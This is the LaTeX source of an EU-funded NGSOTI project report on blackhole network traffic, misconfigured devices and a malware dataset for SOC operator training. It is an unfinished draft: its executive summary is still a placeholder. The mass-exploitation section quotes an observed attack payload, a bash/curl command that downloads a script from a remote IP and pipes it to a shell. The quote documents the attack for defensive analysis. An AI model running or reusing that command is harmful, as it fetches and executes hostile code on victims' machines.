\documentclass[10pt,a4paper]{report}

% Packages for formatting and styling
\usepackage{graphicx} % For including images
\usepackage{hyperref} % For hyperlinks and metadata
\usepackage{fancyhdr} % For headers and footers
\usepackage{geometry} % Adjusting page geometry
\usepackage{lastpage}
% Page geometry
\geometry{
    a4paper,
    top=2.5cm,
    bottom=2.5cm,
    left=2.5cm,
    right=2.5cm
}

% Define variables
\newcommand{\delivtitle}{D2.2 - NGSOTI data key findings report \#1}
\newcommand{\delivdate}{December 9, 2024}

% Hyperref setup
\hypersetup{
    pdftitle={\delivtitle},
    pdfauthor={TEAM NGSOTI},
    pdfsubject={EU Project Deliverable Report},
    pdfkeywords={NGSOTI, misconfiguration, network monitoring, mass exploitation, mirai},
    colorlinks=true,
    linkcolor=blue,
    urlcolor=blue
}

% Set up the header and footer
\pagestyle{fancy}
\fancyhf{} % Clear all header and footer fields
\fancyhead[L]{NGSOTI – Project: 101127921 —  DIGITAL-ECCC-2022-CYBER-03}
\fancyfoot[C]{\delivtitle{} - Page \thepage/\pageref{LastPage}}

% Title page setup
\title{
    \Huge \textbf{\delivtitle} \\[0.5cm]
    \includegraphics[width=0.3\textwidth]{img/ngsoti.eps}
    \hspace{1cm}
    \includegraphics[width=0.3\textwidth]{img/eu_funded_en.eps}
}
\author{\textbf{TEAM NGSOTI}}
\date{\delivdate}

% Document starts here
\begin{document}

% Title page
\maketitle
\thispagestyle{empty} % Remove header and footer from the title page

% Table of contents
\newpage
\tableofcontents
\newpage
\section*{Disclaimer}
Co-funded by the European Union. Views and opinions expressed are however those of the author(s) only
and do not necessarily reflect those of the European Union or the European Cybersecurity Competence Centre. Neither
the European Union nor the granting authority can be held responsible for them.
% Main content
\section*{Executive Summary}
\addcontentsline{toc}{section}{Executive Summary}
Replace with actual content.

% Abstract
\chapter*{Abstract}
The Next Generation Security Operator Training Infrastructure (NGSOTI) aims to provide an open-source environment for Security Operations Center (SOC) operators to train in handling network-related alerts. This document outlines the objectives, methodologies, and findings of the NGSOTI project, including a detailed analysis of misconfigured systems and blackhole traffic data.

% Table of Contents
\tableofcontents

% Chapter 1: Introduction
\chapter{Introduction}
The NGSOTI project is a collaborative effort aimed at enhancing the training infrastructure for SOC operators. Coordinated by CIRCL, the initiative involves partnerships with Restena, Tenzir, and the University of Luxembourg. The project began on January 1, 2024, and is scheduled to conclude on December 31, 2026, with a total budget of €1,477,349.00. CIRCL leads the effort as the project coordinator, with additional funding provided by the European Union.

NGSOTI's primary goal is to equip SOC operators with practical tools and methodologies to handle real-world incidents. It is set to to bridge the gap between theoretical knowledge and practical application, preparing operators for evolving threats through hands-on experience. By leveraging open-source technologies, the project seeks to create a training platform that emphasizes practical skills, ensuring operators are well-prepared for emerging cybersecurity challenges.

Moreover, the datasets created and collected throughout the lifespan of the project are currently being used and will continue to be used for research. The references to the datasets are published on the NGOSTI GitHub repository\footnote{\url{https://github.com/ngsoti/ngsoti/blob/main/datasets.md}}. Research activities could include the detection of new types of threats and modeling them to build predictive and preventive systems that will help SOC operators improve detection methods. An important aspect of NGSOTI data is that it consists of real data recorded in live mode.

This report is structured as follows: Chapter 2 revisits the project's objectives, Chapter 3 combines blackhole traffic analysis with key observations, and Chapter 4 presents real-world case studies derived from the blackhole data, and finally a conclusion in chapter 5.


% Chapter 2: Objectives
\chapter{Objectives}
The NGSOTI project aims to establish an open-source infrastructure tailored for SOC operator training. The infrastructure is designed to address key aspects of cybersecurity operations, including incident response which would equip operators with tools to swiftly detect and mitigate threats, as well as handling crisis situations; log management, which is essential for analyzing vast amounts of data recorded from multiples devices in a network, and take appropriate actions and SOC management processes to better streamline operational efficiency. Additionally, the project emphasizes communication for a better team coordination, documentation for an accurate reporting and swift handling of issues, and the integration of cyber threat intelligence (CTI) using tools like MISP, which provide actionable insights into emerging threats and would enable a better prevention when combined with other tools and sensors like the blackhole.

By employing technologies such as Suricata for intrusion detection, Zeek for detailed network logs, and Tenzir and parallel processing tools to handle large-scale security data, the project seeks to enhance intrusion detection and analysis capabilities. Tools like FlowIntel for case management and OpenNMS for monitoring are also integral to the training platform. Furthermore, the action incorporates MeliCERTes' Cerebrate tool, which improves collaboration and intelligence sharing across security communities ensuring a comprehensive approach to SOC training.


% Chapter 3: Blackhole Traffic Analysis
\chapter{Blackhole Traffic Analysis}


The project uses a methodical approach to analyze misconfigured systems by routing unused network ranges to a specific IP address for full packet capture. This setup allows for the collection of data on network activities that may indicate misconfigurations or malicious behavior. The captured data is streamed unidirectionally to a D4 collector, enabling a detailed analysis of the traffic.

The dataset analyzed during the project spans from January 1, 2024, to October 17, 2024, and includes over 10,226 unique destination IP addresses. In total, 4.31 TB of data was collected. This data provides invaluable insights into the nature of misconfigured devices and the patterns of malicious activities observed within the blackhole networks.

An evolution of the volume of the dataset is shown in figured \ref{countedpacket}. The figure shows a gap between May and June due to DNS issues on the sensor, which was unable to reach the collector. Several peaks were observed on 2024-07-01, 2024-08-27, and 2024-08-28.

\begin{figure}
    \input{img/counted-packets.tex}
    \caption{Collected IP packets over time}
    \label{countedpacket}
\end{figure}

Misconfigured devices are a recurring theme in the analysis. These misconfigurations often result from typographical errors or improper default routing setups. For instance, devices that send SYSLOG messages to unintended networks represent a common type of misconfiguration. Similarly, MikroTik routers are often observed connecting to external services, such as \texttt{cloud.mikrotik.com}, due to default configurations.

DNS misconfigurations are another significant finding. When a secondary DNS resolver is misconfigured, it frequently goes unnoticed, leading to unintended traffic redirection. These observations highlight the importance of proper configuration and monitoring practices to avoid exposing sensitive systems to potential threats.

% Chapter 5: Example Cases
\chapter{Example Cases}
\section{Mass Exploitation of Devices}
Mass exploitation campaigns are a critical concern in cybersecurity. Attackers often exploit known vulnerabilities as soon as they are disclosed.

Figure \ref{countedexploits} illustrates the evolution of exploits discovered over time in the dataset.

\begin{figure}
    \input{img/exploits.tex}
    \caption{Discovered Exploits}
    \label{countedexploits}
\end{figure}
% Chapter 4: Observations


A notable example observed during the project was the exploitation of the Zyxel router vulnerability (CVE-2023-28771), which allowed attackers to bypass authentication. The exploitation involved malicious payloads, such as the following command executed on vulnerable systems:
\begin{verbatim}
bash -c "curl http://92.60.77.85/z -o-|sh";
\end{verbatim}
This case underscores the need for timely patching and proactive defense mechanisms to mitigate the risks associated with known vulnerabilities.

\section{SYSLOG Misconfigurations}
Another observed issue was the improper configuration of SYSLOG services. Devices inappropriately sent SYSLOG messages to blackhole networks. For example, a SYSLOG message from a misconfigured firewall contained the following:
\begin{verbatim}
2024-10-01 12:49:18 IP x.x.196.218.45389 > x.x.x.x.514: SYSLOG local0.info
\end{verbatim}
This type of misconfiguration can result in the unintentional exposure of internal system information, creating vulnerabilities for exploitation.

The sample of keywords was extracted from the syslog message to derive the origine of the devices.

        \begin{itemize}
            \item test\_notify\_glucose
            \item test\_notify\_hyperkalemia
            \item test\_notify\_hypokalemia
            \item test\_notify\_hyponatremia
            \item test\_notify\_na
            \item test\_xray\_report
            \item Gateway
            \item Internal
            \item Network
            \item Packet
            \item Policy
            \item SharedOfficeWAN
            \item Password
            \item Python
            \item Peer
            \item Pwn2Own
            \item Schneider
            \item ServiceDesk
            \item TELEPHONE
            \item ThawtePremiumServerCA
            \item ThawteCodeSigningCA
            \item WebAccess
            \item WebSupport
            \item Cisco
            \item CiscoBlogSmallBusiness
            \item vpncisco
            \item nettexvpn
            \item officevpn
            \item openvpn
            \item poavpn
            \item scancode\_vpn
        \end{itemize}

\section{Intercom Systems and XML Messages}
Misconfigured intercom systems were also identified during the analysis. For example, an intercom system transmitted an XML-based message containing sensitive details, such as device serial numbers and IP addresses:
\begin{verbatim}
<videoIntercomMsg>
<header>
<method>1</method>
<action>1</action>
<from><deviceSN>Q05586499</deviceSN></from>
</header>
</videoIntercomMsg>
\end{verbatim}
Such exposures highlight the risks associated with improper device configuration and the potential for unauthorized access to sensitive systems.



% Chapter about malware dataset
\chapter{Malware Dataset}

In the context of the NGSOTI project, we are actively growing and maintaining a malware samples dataset\footnote{\href{https://helga.circl.lu/NGSOTI/malware-dataset}{https://helga.circl.lu/NGSOTI/malware-dataset}}. This initiative does not aim to create yet another malware-sharing repository. Instead, its primary objective is to host representative samples from various malware families.

Alongside the malware samples, the dataset also includes analysis data—such as packet capture (PCAP) files, log files, and other artifacts—extracted through automated analysis. These analyses leverage tools developed within the NGSOTI project, including Kunai\footnote{\href{https://github.com/kunai-project/kunai}{https://github.com/kunai-project/kunai}}. This dataset serves as a foundational resource for further activities and research within the project.

The following are the key applications we plan for this data:

\begin{itemize}
	\item Rule Development and Sharing: Leverage Kunai logs to create and share detection rules with the community\footnote{\href{https://github.com/kunai-project/community-rules}{https://github.com/kunai-project/community-rules}}. These rules aim to enhance threat detection and provide actionable intelligence.
	\item SOC Training Scenarios: Use Kunai logs and PCAP files as realistic injects for Security Operations Center (SOC) training exercises. This enables the simulation of real-world attack scenarios to enhance the skills of SOC analysts.
\end{itemize}




% Chapter 6: Conclusions
\chapter{Conclusions}
The NGSOTI project demonstrates the critical importance of proper configuration and monitoring in maintaining the security of networked systems. Misconfigured devices, often the result of typographical errors or default settings, represent a significant security risk. The rapid exploitation of known vulnerabilities further emphasizes the need for proactive measures, such as timely patching and effective monitoring.

The project's open-source approach provides a valuable training platform for SOC operators, enabling them to work with real-world data and tools. By fostering practical skills and emphasizing real-time analysis, NGSOTI equips cybersecurity professionals to better respond to emerging threats.
% References
\bibliographystyle{plain}
\bibliography{references} % Add your bibliography file here

% End of document
\end{document}

